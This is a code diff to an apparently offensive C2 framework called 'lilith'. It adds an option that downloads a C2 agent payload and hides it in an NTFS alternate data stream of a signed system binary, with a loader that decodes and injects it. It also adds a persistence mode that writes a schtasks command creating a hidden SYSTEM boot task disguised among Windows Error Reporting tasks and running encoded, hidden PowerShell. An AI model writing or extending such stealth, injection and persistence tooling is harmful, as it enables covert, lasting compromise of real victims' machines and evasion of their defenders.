@@ -138,6 +138,18 @@ BUILD FLAGS
                           • Feed captures to hashcat/Responder for NTLM relay
     --ntlm-out DIR      Output directory  (default: <workspace>/ntlm_trigger/)
 
+  --ads [TOOL]          Stage payload in NTFS ADS + generate offline loader pair:
+                          • ads_plant_<hex>.ps1: downloads .enc from C2 via SslStream,
+                            writes raw bytes to an ADS of a signed system binary
+                            (no standalone payload file on disk)
+                          • ads_load_<hex>.ps1: reads from ADS, two-layer XOR decodes,
+                            injects via compiled inject DLL — no network required
+                          • Bare --ads defaults to C2 agent shellcode
+                          • ADS survives standard dir/Explorer enumeration; needs
+                            dir /r or Streams.exe to find
+    --ads-host FILE     ADS host file path (default: randomised signed system binary)
+    --ads-stream NAME   ADS stream name (default: randomised)
+
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 C2 FLAGS  (lilith c2 ...)
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -154,6 +166,9 @@ C2 FLAGS  (lilith c2 ...)
                           run      → HKCU Run key (fires at next user logon)
                           schtask  → Scheduled task (fires at logon, HighestAvailable)
                           wmi      → WMI CommandLine Consumer (fires on explorer.exe start)
+                          wer      → WER-masked SYSTEM task in
+                                     \\Microsoft\\Windows\\Windows Error Reporting\\
+                                     (fires at boot, requires admin)
                           All embed payload as base64 -enc; no plaintext in registry/WMI
   --kill SID            Remove a session from the server registry (use after migration)
 
@@ -736,11 +751,32 @@ def cmd_build(args, cfg, ws):
         build_ntlm_triggers(lhost, ntlm_out)
         did_something = True
 
+    # ── ADS staging ───────────────────────────────────────────────────────────
+    if getattr(args, "ads", None) is not None:
+        tname = args.ads or "__c2_agent__"
+        enc_name = ws.get_enc_name(tname)
+        if not enc_name or not os.path.exists(ws.path(enc_name)):
+            hint = "lilith build --c2-stager" if tname == "__c2_agent__" else f"lilith build --tool {tname}"
+            print(f"[!] No encoded artifact for '{tname}' — run: {hint}")
+            sys.exit(1)
+        from builders.ads_stage import build_ads_stager
+        build_ads_stager(
+            enc_filename = enc_name,
+            lhost        = cfg.get("lhost", "10.10.14.1"),
+            port         = cfg.get("http_port", 8443),
+            url_prefix   = cfg.get("url_prefix", "/cdn/static/v3"),
+            out_dir      = ws.directory,
+            host_file    = getattr(args, "ads_host",   None),
+            stream_name  = getattr(args, "ads_stream", None),
+            user_agent   = cfg.get("user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0"),
+        )
+        did_something = True
+
     if not did_something:
         print("[!] Nothing to build — specify --runner, --tool NAME, --tools, --stager NAME,")
         print("    --stagers, --all, --escalate POTATO --system-tool TOOL,")
         print("    --shellcode FILE --name NAME, --c2-stager, --byovd, --usb TOOL,")
-        print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger,")
+        print("    --ble TOOL, --smuggle [TOOL], --ntlm-trigger, --ads [TOOL],")
         print("    --android-ble, --android-payload, --android-ble + --android-payload,")
         print("    or --wasm [--wasm-exe NAME] [--wasm-title TITLE]")
 
@@ -815,6 +851,24 @@ def _build_persist_cmd(persist_type: str, cfg: dict, ws: Workspace) -> str | Non
             f'schtasks /create /tn "{rand_name}" /tr '
             f'"powershell {task_arg}" '
             f'/sc ONLOGON /ru "%USERDOMAIN%\\%USERNAME%" /rl HIGHEST /f'
+        )
+
+    elif persist_type == "wer":
+        # Scheduled task hidden in the WER task folder — blends with legitimate WER
+        # infrastructure. Runs as NT AUTHORITY\SYSTEM (requires admin/SYSTEM context).
+        # Trigger: ONSTART fires at every boot before logon; harder to notice than
+        # a custom task in the root folder.
+        _wer_names = [
+            "WerKernelReporting", "AppCrashUpload", "WerFaultSilent",
+            "WatsonUploaderTask", "WerSubmitService", "DiagTrackerReporting",
+        ]
+        import random as _rnd
+        wer_task = _rnd.choice(_wer_names)
+        task_arg = f"-nop -w hidden -ep bypass -enc {enc_b64}"
+        return (
+            f'schtasks /create /tn "\\Microsoft\\Windows\\Windows Error Reporting\\{wer_task}" '
+            f'/tr "powershell {task_arg}" '
+            f'/sc ONSTART /ru "NT AUTHORITY\\SYSTEM" /f'
         )
 
     elif persist_type == "wmi":
@@ -989,6 +1043,7 @@ def cmd_c2(args, cfg, ws):
             "run":     "HKCU Run key fires at next user logon",
             "schtask": "Scheduled task fires at next user logon",
             "wmi":     "WMI subscription fires 120s after next boot/resume",
+            "wer":     "WER-masked SYSTEM task fires at every boot (requires admin)",
         }.get(args.persist, "")
         if mech:
             print(f"\n[*] {mech}")
@@ -1460,6 +1515,12 @@ def main():
                          help="Generate .url/.scf/.searchConnector NTLM trigger files (auto-auth on folder browse)")
     build_p.add_argument("--ntlm-out",      metavar="DIR",   dest="ntlm_out",     default=None,
                          help="Output directory for NTLM trigger files (default: <workspace>/ntlm_trigger/)")
+    build_p.add_argument("--ads",           metavar="TOOL",  dest="ads", nargs="?", const="__c2_agent__",
+                         help="Stage payload in NTFS ADS + generate offline loader (default: C2 agent)")
+    build_p.add_argument("--ads-host",      metavar="FILE",  dest="ads_host",  default=None,
+                         help="Host file for ADS (default: randomised from preset signed system binaries)")
+    build_p.add_argument("--ads-stream",    metavar="NAME",  dest="ads_stream", default=None,
+                         help="ADS stream name (default: randomised)")
 
     serve_p = sub.add_parser("serve", help="Start HTTPS server + callback listener")
     serve_p.add_argument("--port",      type=int, metavar="PORT", help="Override http_port from config")
@@ -1480,9 +1541,10 @@ def main():
                       help="Result wait timeout in seconds (default: c2_timeout_s from config, or 50)")
     c2_p.add_argument("--migrate", metavar="PROC", nargs="?", const="",
                       help="Migrate agent to another process (optional: target process name, e.g. svchost.exe)")
-    c2_p.add_argument("--persist", metavar="TYPE", choices=["wmi", "run", "schtask"],
-                      help="Install persistence: wmi (admin/SYSTEM, WMI subscription) | "
-                           "run (user, HKCU Run key) | schtask (user, scheduled task at logon)")
+    c2_p.add_argument("--persist", metavar="TYPE", choices=["wmi", "run", "schtask", "wer"],
+                      help="Install persistence: wmi (admin, WMI subscription) | "
+                           "run (user, HKCU Run key) | schtask (user, logon task) | "
+                           "wer (admin/SYSTEM, WER-masked SYSTEM task at boot)")
     c2_p.add_argument("--kill",       metavar="SID",
                       help="Remove a session from the registry (use after migration to clean up old session)")
     c2_p.add_argument("--upload",     metavar=("LOCAL", "REMOTE"), nargs=2,
